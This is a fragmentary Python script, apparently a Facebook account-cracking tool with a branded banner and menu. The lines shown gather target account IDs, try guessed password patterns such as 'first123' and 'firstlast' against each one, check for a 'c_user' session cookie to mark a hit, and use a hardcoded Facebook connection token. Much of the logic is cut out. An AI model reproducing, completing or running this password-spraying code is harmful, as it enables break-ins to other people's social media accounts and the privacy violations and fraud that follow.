...
\033[1;37m      
\033[1;37m------------------------------------------------
\033[1;37m Owner   :            Mahfuz Hasan 
\033[1;37m Facebook:            Md Mahfuz Hasan 
\033[1;37m Github  :            MAHFUZ-55
...
def result(OKs,cps):
    if len(OKs) != 0 or len(cps) != 0:
        ...
        print(47*'-')
        input("Press enter to back MAHFUZ Menu ")
        exit()
...
def sarfraz():   
    ...
    if select =='1':
       ...
       cutter()
        ...
        os.system('xdg-open https://www.facebook.com/100037510549548/posts/840134467246897/?app=fbl ')
        pass
    elif select =='F':
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
        ...
        try:
            for pw in psw:
                ...
                if 'c_user' in session.cookies.get_dict():
                    print(f"\r{R} [MAHFUZ-OK] {sid} | {ps} {M}")
                    oks.append(sid)
    ...
    def pasw(self):       
            ...
            os.system("clear")
            print(logo)
            print(f'{M} [Example: first123,last1122,firstlast,last,ETC]')
            print('')
            if sl =='':
    ...
    try:
        ...
        for fbuid in fbidz:
            ...
            try:
                ...
                sys.stdout.write(f"\r\r{M}Collection IDs = [{fx}]{S}");sys.stdout.flush()
            except KeyError:
                pass
        apnd.close()
        print('')
...
def cutter():
    ...
    print(47*'-')
    input(f"{M} Press Enter To Back MAHFUZ Menu ")
    menu
